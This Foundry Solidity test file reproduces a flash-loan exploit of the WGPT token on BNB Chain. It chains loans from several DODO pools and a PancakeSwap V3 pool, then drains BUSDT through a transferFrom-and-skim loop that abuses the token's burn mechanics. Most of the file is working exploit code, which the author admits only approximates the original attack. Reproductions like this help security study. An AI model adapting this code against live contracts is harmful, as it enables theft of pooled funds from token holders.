// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~80K USD$
// Attacker : https://bscscan.com/address/0xdc459596aed13b9a52fb31e20176a7d430be8b94
// Attack Contract : https://bscscan.com/address/0x5336a15f27b74f62cc182388c005df419ffb58b8
// Vulnerable Contract : https://bscscan.com/address/0x1f415255f7e2a8546559a553e962de7bc60d7942
// Attack Tx : https://bscscan.com/tx/0x258e53526e5a48feb1e4beadbf7ee53e07e816681ea297332533371032446bfd

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1679042549946933248
// https://twitter.com/BeosinAlert/status/1679028240982368261

interface IWGPT is IERC20 {
    function isSwap() external returns (bool);

    function burnToken() external returns (bool);

    function burnRate() external returns (uint256);
}

contract WGPTTest is Test {
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    // Token created by the exploiter
    IERC20 private constant ExpToken = IERC20(0xe1272a840F574b68dE861eC5009784e3411cb96c);
    IWGPT private constant WGPT = IWGPT(0x1f415255f7E2a8546559a553E962dE7BC60d7942);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    // Pancake Pair created by the exploiter
    Uni_Pair_V2 private constant BUSDT_ExpToken = Uni_Pair_V2(0xaa07222e4c3295C4E881ac8640Fbe5fB921D6840);
    Uni_Pair_V2 private constant WGPT_BUSDT = Uni_Pair_V2(0x5a596eAE0010E16ed3B021FC09BbF0b7f1B2d3cD);
    IDPPOracle private constant DPPOracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle private constant DPPOracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle private constant DPPOracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle private constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle private constant DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    Uni_Pair_V3 private constant PoolV3 = Uni_Pair_V3(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
    address private constant exploiter = 0xdC459596aeD13B9a52FB31E20176a7D430Be8b94;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 29_891_709);
        cheats.label(address(BUSDT), "BUSDT");
        cheats.label(address(ExpToken), "ExpToken");
        cheats.label(address(WGPT), "WGPT");
        cheats.label(address(Router), "Router");
        cheats.label(address(BUSDT_ExpToken), "BUSDT_ExpToken");
        cheats.label(address(WGPT_BUSDT), "WGPT_BUSDT");
        cheats.label(address(DPPOracle1), "DPPOracle1");
        cheats.label(address(DPPOracle2), "DPPOracle2");
        cheats.label(address(DPPOracle3), "DPPOracle3");
        cheats.label(address(DPP), "DPP");
        cheats.label(address(DPPAdvanced), "DPPAdvanced");
        cheats.label(address(PoolV3), "PoolV3");
        cheats.label(exploiter, "Exploiter");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        emit log_named_decimal_uint("Attacker BUSDT balance before", BUSDT.balanceOf(address(this)), BUSDT.decimals());
        ExpToken.approve(address(Router), type(uint256).max);
        BUSDT.approve(address(Router), type(uint256).max);
        WGPT.approve(address(this), type(uint256).max);
        bytes memory swapData =
            hex"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000027b46536c66c8e3000000000000000000000000000000000000000000000000002a5a058fc295ed000000000000000000000000000000000000000000000000000000000000000000008c00000000000000000000000000000000000000000000065a4da25d3016c00000";

        if (WGPT.isSwap()) {
            WGPT.burnToken();
        }

        assertEq(WGPT.burnRate(), 2000);

        vm.startPrank(address(this), exploiter);
        BUSDT_ExpToken.swap(BUSDT.balanceOf(address(BUSDT_ExpToken)) / 10, 90e18, address(this), swapData);
        vm.stopPrank();

        emit log_named_decimal_uint("Attacker BUSDT balance after", BUSDT.balanceOf(address(this)), BUSDT.decimals());
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        BUSDT.transfer(address(WGPT), 1);
        BUSDT.transfer(address(WGPT_BUSDT), 2);
        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), _data);
        ExpToken.transfer(address(WGPT_BUSDT), 10);
        ExpToken.transfer(address(WGPT), 100);
        BUSDT.transfer(address(BUSDT_ExpToken), _amount0);
        ExpToken.transfer(address(BUSDT_ExpToken), 90_909 * 1e15);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == address(DPPOracle1)) {
            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), data);
        } else if (msg.sender == address(DPPOracle2)) {
            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), data);
        } else if (msg.sender == address(DPPOracle3)) {
            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), data);
        } else if (msg.sender == address(DPP)) {
            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), data);
        } else {
            PoolV3.flash(address(this), 76_727_748_945_585_195_946_976, 0, bytes(""));
        }
        BUSDT.transfer(msg.sender, quoteAmount);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(WGPT);
        Router.swapExactTokensForTokens(200_000 * 1e18, 0, path, address(this), block.timestamp + 1000);
        assertEq(WGPT.burnRate(), 2000);
        BUSDT.transfer(address(WGPT), 30_000 * 1e18);
        ExpToken.transfer(address(WGPT_BUSDT), 1e6);
        ExpToken.transfer(address(WGPT), 1);

        // Surely math here for transfer amount calculation is different (and it's not entirely clear to me)
        // I use following code here only for PoC to work
        // Start exploit
        while (WGPT_BUSDT.totalSupply() > 100_200 * 1e18) {
            WGPT.transferFrom(address(this), address(WGPT_BUSDT), WGPT.balanceOf(address(this)) / 99);
            WGPT_BUSDT.skim(address(this));
        }
        // End exploit

        ExpToken.transfer(address(WGPT_BUSDT), 2000);
        ExpToken.transfer(address(WGPT), 1000);
        // ExpToken.transferFrom(exploiter, address(this), 400_000 * 1e18);
        // No sufficient allowance so using deal cheat here
        deal(address(ExpToken), address(this), ExpToken.balanceOf(address(this)) + 400_000 * 1e18);
        path[0] = address(WGPT);
        path[1] = address(BUSDT);
        uint256[] memory amounts = Router.getAmountsOut(WGPT.balanceOf(address(this)) - 128e18, path);
        WGPT.transfer(address(WGPT_BUSDT), WGPT.balanceOf(address(this)));
        WGPT_BUSDT.swap(0, amounts[1], address(this), bytes(""));
        BUSDT.transfer(address(PoolV3), 76_727_748_945_585_195_946_976 + fee0);
    }
}
